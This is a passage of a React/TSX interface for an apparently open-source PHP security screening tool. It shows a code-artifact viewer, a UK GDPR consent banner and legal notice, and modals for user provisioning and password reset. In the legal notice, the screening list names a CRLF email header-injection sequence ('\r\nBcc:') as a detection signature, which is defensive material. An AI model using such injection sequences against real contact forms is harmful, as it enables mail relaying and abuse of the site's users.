                      <span>Copy {phpArtifacts[selectedArtifactIndex].filename}</span>
                    </>
                  )}
                </button>
                <button
                  type="button"
                  onClick={() =>
                    handleDownloadFile(
                      phpArtifacts[selectedArtifactIndex].filename,
                      phpArtifacts[selectedArtifactIndex].code
                    )
                  }
                  className="px-3.5 py-1.5 text-xs font-semibold text-slate-950 bg-sky-400 hover:bg-sky-300 rounded-md transition-colors flex items-center gap-1.5 whitespace-nowrap shrink-0 cursor-pointer"
                >
                  <Download className="w-3.5 h-3.5" />
                  <span>Download File</span>
                </button>
              </div>
            </div>

            <div className="bg-slate-900/50 border border-slate-800 rounded-lg overflow-hidden">
              <div className="px-6 py-4 border-b border-slate-800 flex flex-col sm:flex-row sm:items-center justify-between gap-2 bg-slate-950/50">
                <div>
                  <h2 className="text-sm font-semibold text-white font-mono">
                    {phpArtifacts[selectedArtifactIndex].filename} —{' '}
                    <span className="font-sans text-slate-300">
                      {phpArtifacts[selectedArtifactIndex].title}
                    </span>
                  </h2>
                  <p className="text-xs text-slate-400 mt-0.5">
                    {phpArtifacts[selectedArtifactIndex].description}
                  </p>
                </div>
                <div className="text-xs font-mono text-slate-400 shrink-0">
                  Controller: {config.organizationName} ({config.icoRegistrationNumber})
                </div>
              </div>
              <pre className="p-6 text-xs font-mono text-slate-200 bg-[#060911] overflow-x-auto leading-relaxed max-h-[640px]">
                <code>{phpArtifacts[selectedArtifactIndex].code}</code>
              </pre>
            </div>
          </div>
        )}
      </main>

      {/* BuruOps Project Attribution Footer */}
      <footer className="max-w-[1400px] w-full mx-auto px-6 pt-6 pb-2 border-t border-slate-800/80 text-xs text-slate-500 flex flex-col sm:flex-row items-center justify-between gap-3">
        <div className="flex items-center gap-2">
          <span className="font-semibold text-slate-300">AegisPHP</span>
          <span aria-hidden="true">&bull;</span>
          <span>Open-source project from <strong className="text-slate-300 font-medium">BuruOps</strong></span>
          <span aria-hidden="true">&bull;</span>
          <span>Engr. Buru</span>
        </div>
        <div className="flex items-center gap-4 text-slate-400">
          <span>Licensed under MIT with Attribution</span>
          <span aria-hidden="true">&bull;</span>
          <span>UK GDPR Art. 6(1)(f) &amp; PECR Reg. 6</span>
        </div>
      </footer>

      {/* ===================================================================
       * LIVE INTERACTIVE UK REGULATORY SCREENING AGREEMENT BANNER
       * Shows visitors that anyone using the website, forms, SMTP or DM is
       * actively screened and logged under UK GDPR & PECR.
       * =================================================================== */}
      {!bannerMinimized && config.bannerPosition !== 'inline_form_gate' && (
        <aside
          aria-label="UK Regulatory Security & Anti-Abuse Screening Notice"
          className={`fixed left-0 right-0 z-40 bg-[#0b1120]/95 backdrop-blur border-t border-slate-700/90 px-6 py-3 shadow-2xl ${
            config.bannerPosition === 'top_bar' ? 'top-14 border-b border-t-0' : 'bottom-0'
          }`}
        >
          <div className="max-w-[1400px] mx-auto flex flex-col md:flex-row md:items-center justify-between gap-4">
            <div className="flex items-start gap-3 text-xs text-slate-300 leading-relaxed">
              <Shield className="w-4 h-4 text-sky-400 shrink-0 mt-0.5" />
              <div>
                <span className="font-semibold text-white">
                  UK Security &amp; Anti-Abuse Screening Active ({config.organizationName} · ICO Reg:{' '}
                  <span className="font-mono">{config.icoRegistrationNumber}</span>):
                </span>{' '}
                By accessing this website or submitting any input (including SMTP email dispatch, Direct Messages, or contact forms), you acknowledge and agree that your request headers, IP reputation (pseudonymised), email format, and behavioral input patterns are screened and logged for security protection in accordance with{' '}
                <span className="text-slate-200 underline decoration-slate-600">
                  UK GDPR Article 6(1)(f) (Recital 49)
                </span>{' '}
                and <span className="text-slate-200 underline decoration-slate-600">PECR Regulation 6</span>.
              </div>
            </div>

            <div className="flex items-center gap-2.5 shrink-0">
              <button
                type="button"
                onClick={() => setShowLegalModal(true)}
                className="px-3 py-1.5 text-xs font-medium text-slate-300 hover:text-white border border-slate-700 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
              >
                UK Legal Notice
              </button>
              <button
                type="button"
                onClick={() => {
                  setBannerAgreed(true);
                  setBannerMinimized(true);
                }}
                className="px-3.5 py-1.5 text-xs font-semibold text-slate-950 bg-sky-400 hover:bg-sky-300 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
              >
                Agree &amp; Acknowledge Screening
              </button>
            </div>
          </div>
        </aside>
      )}

      {/* Floating Re-Open Pill if Banner was Minimized */}
      {bannerMinimized && (
        <div className="fixed bottom-4 right-6 z-40">
          <button
            type="button"
            onClick={() => setBannerMinimized(false)}
            className="px-3.5 py-2 text-xs font-medium bg-slate-900/95 hover:bg-slate-800 text-slate-200 border border-slate-700 rounded-lg shadow-lg flex items-center gap-2 cursor-pointer"
          >
            <Shield className="w-3.5 h-3.5 text-sky-400" />
            <span>UK Screening Notice: Agreed ({config.icoRegistrationNumber})</span>
          </button>
        </div>
      )}

      {/* ===================================================================
       * UK GDPR ARTICLE 13 & PECR TRANSPARENCY MODAL
       * =================================================================== */}
      {showLegalModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/75 p-4">
          <div className="bg-slate-900 border border-slate-700 rounded-xl max-w-2xl w-full p-6 space-y-5 shadow-2xl">
            <div className="flex items-start justify-between gap-4 border-b border-slate-800 pb-4">
              <div>
                <div className="text-xs text-sky-400 font-medium">
                  UK GDPR Article 13 &amp; PECR Regulation 6 Transparency Statement
                </div>
                <h2 className="text-lg font-bold text-white mt-0.5">
                  Automated Security Screening &amp; Protective Logging Notice
                </h2>
              </div>
              <button
                type="button"
                onClick={() => setShowLegalModal(false)}
                className="p-1 text-slate-400 hover:text-white rounded-md cursor-pointer"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            <div className="space-y-3 text-xs text-slate-300 leading-relaxed max-h-[60vh] overflow-y-auto pr-1">
              <p>
                <strong>Data Controller:</strong> {config.organizationName} (ICO Registration Number:{' '}
                <span className="font-mono">{config.icoRegistrationNumber}</span> · Security Contact:{' '}
                <span className="font-mono">{config.dpoContactEmail}</span>).
              </p>
              <p>
                <strong>Scope of Screening:</strong> Every interactive form, outbound SMTP email trigger, Direct Message (DM) channel, and API endpoint on this application is protected by <strong>AegisPHP</strong>. Anyone accessing or submitting data to this service is screened in real time to mitigate automated bot attacks, SMTP header injection, credential stuffing, and human abuse.
              </p>
              <div className="bg-slate-950 border border-slate-800 rounded-lg p-3.5 space-y-2">
                <div className="font-semibold text-white">What Data Points Are Screened?</div>
                <ul className="space-y-1 text-slate-400">
                  <li>
                    • <strong>IP Reputation &amp; Network ASN:</strong> Checked against known Tor exit nodes, bulletproof hosts, and DNSBLs. Stored strictly in pseudonymised format ({config.ipPseudonymisationMode}).
                  </li>
                  <li>
                    • <strong>Email Format &amp; SMTP Hygiene:</strong> Checked for RFC 5322 validity, disposable domains, local-part Shannon entropy, and CRLF header injection sequences (<code className="text-slate-300">\r\nBcc:</code>).
                  </li>
                  <li>
                    • <strong>Behavioral &amp; Payload Heuristics:</strong> Evaluates character Shannon entropy, QWERTY keyboard mashing, form fill cadence, and SQLi/XSS/PHP injection signatures.
                  </li>
                  <li>
                    • <strong>HTTP Request Headers:</strong> Verifies <code className="text-slate-300">Sec-Fetch-Site</code>, <code className="text-slate-300">Accept-Language</code>, <code className="text-slate-300">User-Agent</code>, and proxy spoofing headers.
                  </li>
                </ul>
              </div>
              <p>
                <strong>Lawful Basis &amp; Retention:</strong> Processed under <strong>UK GDPR Article 6(1)(f)</strong> (Legitimate Interests for Network &amp; Information Security, Recital 49) and <strong>PECR Regulation 6(4)</strong> (strictly necessary security cookie/token). Pseudonymised audit logs are automatically purged after <strong>{config.logRetentionDays} days</strong>.
              </p>
            </div>

            <div className="flex items-center justify-end gap-3 pt-3 border-t border-slate-800">
              <button
                type="button"
                onClick={() => {
                  setBannerAgreed(false);
                  setShowLegalModal(false);
                }}
                className="px-3.5 py-2 text-xs font-medium text-slate-400 hover:text-slate-200 border border-slate-800 rounded-md cursor-pointer"
              >
                Simulate Unacknowledged Client
              </button>
              <button
                type="button"
                onClick={() => {
                  setBannerAgreed(true);
                  setShowLegalModal(false);
                }}
                className="px-4 py-2 text-xs font-semibold text-slate-950 bg-sky-400 hover:bg-sky-300 rounded-md cursor-pointer"
              >
                Agree &amp; Close Notice
              </button>
            </div>
          </div>
        </div>
      )}

      {/* =====================================================================
       * MODAL 2: PROVISION NEW SECOPS OPERATOR / USER
       * ===================================================================== */}
      {showCreateUserModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/80 backdrop-blur-sm animate-in fade-in duration-150">
          <div className="bg-slate-900 border border-slate-800 rounded-xl max-w-lg w-full p-6 shadow-2xl space-y-4">
            <div className="flex items-center justify-between pb-3 border-b border-slate-800">
              <div className="flex items-center gap-2">
                <UserPlus className="w-5 h-5 text-sky-400" />
                <h3 className="text-base font-semibold text-slate-100">
                  Provision New SecOps User
                </h3>
              </div>
              <button
                type="button"
                onClick={() => setShowCreateUserModal(false)}
                className="text-slate-400 hover:text-slate-200 cursor-pointer p-1"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            {userCreateError && (
              <div className="p-3 bg-rose-950/50 border border-rose-800/70 rounded-md text-xs text-rose-300 flex items-center gap-2">
                <AlertTriangle className="w-4 h-4 text-rose-400 shrink-0" />
                <span>{userCreateError}</span>
              </div>
            )}

            <form onSubmit={handleCreateUser} className="space-y-4">
              <div className="space-y-1">
                <label className="block text-xs font-medium text-slate-300">
                  Full Name / Operator Identifier
                </label>
                <input
                  type="text"
                  required
                  placeholder="e.g. Fiona Gallagher"
                  value={createUserName}
                  onChange={(e) => setCreateUserName(e.target.value)}
                  className="w-full px-3 py-2 text-xs bg-slate-950 border border-slate-800 rounded-md text-slate-200 focus:outline-none focus:border-sky-500 font-mono"
                />
              </div>

              <div className="space-y-1">
                <label className="block text-xs font-medium text-slate-300">
                  Email Address (RFC 5322)
                </label>
                <input
                  type="email"
                  required
                  placeholder="e.g. fiona.gallagher@albioncloud.co.uk"
                  value={createUserEmail}
                  onChange={(e) => setCreateUserEmail(e.target.value)}
                  className="w-full px-3 py-2 text-xs bg-slate-950 border border-slate-800 rounded-md text-slate-200 focus:outline-none focus:border-sky-500 font-mono"
                />
              </div>

              <div className="space-y-1">
                <label className="block text-xs font-medium text-slate-300">
                  Role &amp; Permissions Scope
                </label>
                <select
                  value={createUserRole}
                  onChange={(e) => setCreateUserRole(e.target.value as UserRole)}
                  className="w-full px-3 py-2 text-xs bg-slate-950 border border-slate-800 rounded-md text-slate-200 focus:outline-none focus:border-sky-500 font-mono"
                >
                  <option value="admin">admin — Full system management, threshold overrides &amp; key rotation</option>
                  <option value="responder">responder — Triage incidents, unblock IPs, review quarantine</option>
                  <option value="auditor">auditor — Read audit trails, export UK GDPR compliance reports</option>
                  <option value="readonly">readonly — Dashboard inspection and real-time metric views only</option>
                </select>
              </div>

              <div className="space-y-1.5 pt-1">
                <div className="flex items-center justify-between">
                  <label className="block text-xs font-medium text-slate-300">
                    CSPRNG Password Provisioning
                  </label>
                  <button
                    type="button"
                    onClick={handleGeneratePasswordForCreate}
                    className="text-[11px] font-mono text-sky-400 hover:text-sky-300 flex items-center gap-1 cursor-pointer"
                  >
                    <RefreshCw className="w-3 h-3" />
                    <span>Generate 18-Char Password</span>
                  </button>
                </div>
                <div className="relative">
                  <input
                    type="text"
                    required
                    value={createUserPassword}
                    onChange={(e) => setCreateUserPassword(e.target.value)}
                    className="w-full px-3 py-2 text-xs bg-slate-950 border border-slate-800 rounded-md text-amber-300 focus:outline-none focus:border-sky-500 font-mono pr-24"
                    placeholder="Auto-generated or custom strong password"
                  />
                  <button
                    type="button"
                    onClick={() => {
                      if (!createUserPassword) return;
                      navigator.clipboard.writeText(createUserPassword);
                      setPasswordCopiedNotification(true);
                      setTimeout(() => setPasswordCopiedNotification(false), 2000);
                    }}
                    className="absolute right-2 top-1/2 -translate-y-1/2 px-2 py-1 text-[10px] font-mono bg-slate-800 hover:bg-slate-700 text-slate-300 rounded border border-slate-700 cursor-pointer"
                  >
                    {passwordCopiedNotification ? 'Copied!' : 'Copy'}
                  </button>
                </div>

                {createUserPassword && (
                  <div className="flex items-center justify-between text-[11px] font-mono text-slate-400 pt-0.5">
                    <span>
                      Entropy Score:{' '}
                      <strong className="text-emerald-400">
                        {calculatePasswordEntropy(createUserPassword).toFixed(1)} bits
                      </strong>
                    </span>
                    <span className="text-slate-500">Argon2id Hash on Save</span>
                  </div>
                )}
              </div>

              <div className="pt-2">
                <label className="flex items-center gap-2 cursor-pointer text-xs text-slate-300">
                  <input
                    type="checkbox"
                    checked={createUserMustReset}
                    onChange={(e) => setCreateUserMustReset(e.target.checked)}
                    className="rounded border-slate-700 bg-slate-950 text-sky-500 focus:ring-0 cursor-pointer"
                  />
                  <span>Enforce mandatory password reset upon initial login</span>
                </label>
              </div>

              <div className="flex items-center justify-end gap-3 pt-4 border-t border-slate-800">
                <button
                  type="button"
                  onClick={() => setShowCreateUserModal(false)}
                  className="px-3.5 py-2 text-xs font-medium text-slate-400 hover:text-slate-200 border border-slate-800 rounded-md cursor-pointer"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  className="px-4 py-2 text-xs font-semibold text-slate-950 bg-sky-400 hover:bg-sky-300 rounded-md cursor-pointer shadow-sm"
                >
                  Provision &amp; Save User
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* =====================================================================
       * MODAL 3: PASSWORD RESET VERIFICATION & CONSUMPTION
       * ===================================================================== */}
      {showResetModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/80 backdrop-blur-sm animate-in fade-in duration-150">
          <div className="bg-slate-900 border border-slate-800 rounded-xl max-w-lg w-full p-6 shadow-2xl space-y-4">
            <div className="flex items-center justify-between pb-3 border-b border-slate-800">
              <div className="flex items-center gap-2">
                <Key className="w-5 h-5 text-amber-400" />
                <h3 className="text-base font-semibold text-slate-100">
                  Single-Use Password Reset Lifecycle
                </h3>
              </div>
              <button
                type="button"
                onClick={() => setShowResetModal(false)}
                className="text-slate-400 hover:text-slate-200 cursor-pointer p-1"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            <p className="text-xs text-slate-400 leading-relaxed">
              Verify the single-use token against the SHA-256 hash in the database. Upon verification, the old password hash is updated with a new Argon2id hash, and the reset token is permanently burned.
            </p>

            {resetStatusMessage && (
              <div
                className={`p-3 rounded-md text-xs flex items-center gap-2 border ${
                  resetStatusMessage.type === 'success'
                    ? 'bg-emerald-950/50 border-emerald-800/70 text-emerald-300'
                    : 'bg-rose-950/50 border-rose-800/70 text-rose-300'
                }`}
              >
                {resetStatusMessage.type === 'success' ? (
                  <Check className="w-4 h-4 text-emerald-400 shrink-0" />
                ) : (
                  <AlertTriangle className="w-4 h-4 text-rose-400 shrink-0" />
                )}
                <span>{resetStatusMessage.text}</span>
              </div>
            )}

            <form onSubmit={handleCompletePasswordReset} className="space-y-4">
              {activeResetToken && (
                <div className="p-3 bg-slate-950 border border-slate-800 rounded-md space-y-1 text-xs font-mono">
                  <div className="text-slate-400">
                    Account: <span className="text-slate-200">{activeResetToken.email}</span>
                  </div>
                  <div className="text-slate-500 text-[11px]">
                    Token Hash:{' '}
                    <span className="text-amber-400">{activeResetToken.tokenHash.slice(0, 24)}...</span>
                  </div>
                  <div className="text-slate-500 text-[11px]">
                    Expires:{' '}
                    <span className="text-slate-400 tabular-nums">{activeResetToken.expiresAt}</span>
                  </div>
                </div>
              )}

              <div className="space-y-1">
                <label className="block text-xs font-medium text-slate-300">
                  Single-Use Reset Token (from Email/SMS)
                </label>
                <input
                  type="text"
                  required
                  placeholder="32-byte hexadecimal token..."
                  value={resetTokenInput}
                  onChange={(e) => setResetTokenInput(e.target.value)}
                  className="w-full px-3 py-2 text-xs bg-slate-950 border border-slate-800 rounded-md text-amber-300 focus:outline-none focus:border-sky-500 font-mono"
                />
              </div>

              <div className="space-y-1.5">
                <div className="flex items-center justify-between">
                  <label className="block text-xs font-medium text-slate-300">
                    New Account Password
                  </label>
                  <button
                    type="button"
                    onClick={() => {
                      const pwd = generateSecurePassword(18);
                      setResetNewPassword(pwd);
                    }}
                    className="text-[11px] font-mono text-sky-400 hover:text-sky-300 cursor-pointer"
                  >
                    Generate Strong Password
                  </button>
                </div>
                <input
                  type="text"
                  required
                  placeholder="Minimum 12 characters..."
                  value={resetNewPassword}
                  onChange={(e) => setResetNewPassword(e.target.value)}
                  className="w-full px-3 py-2 text-xs bg-slate-950 border border-slate-800 rounded-md text-slate-200 focus:outline-none focus:border-sky-500 font-mono"
                />
                {resetNewPassword && (
                  <div className="text-[11px] font-mono text-slate-400">
                    Entropy: {calculatePasswordEntropy(resetNewPassword).toFixed(1)} bits
                  </div>
                )}
              </div>

              <div className="flex items-center justify-end gap-3 pt-3 border-t border-slate-800">
                <button
                  type="button"
                  onClick={() => setShowResetModal(false)}
                  className="px-3.5 py-2 text-xs font-medium text-slate-400 hover:text-slate-200 border border-slate-800 rounded-md cursor-pointer"
                >
                  Close
                </button>
                <button
                  type="submit"
                  className="px-4 py-2 text-xs font-semibold text-slate-950 bg-amber-400 hover:bg-amber-300 rounded-md cursor-pointer shadow-sm"
                >
                  Verify Token &amp; Update Password
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  );
}
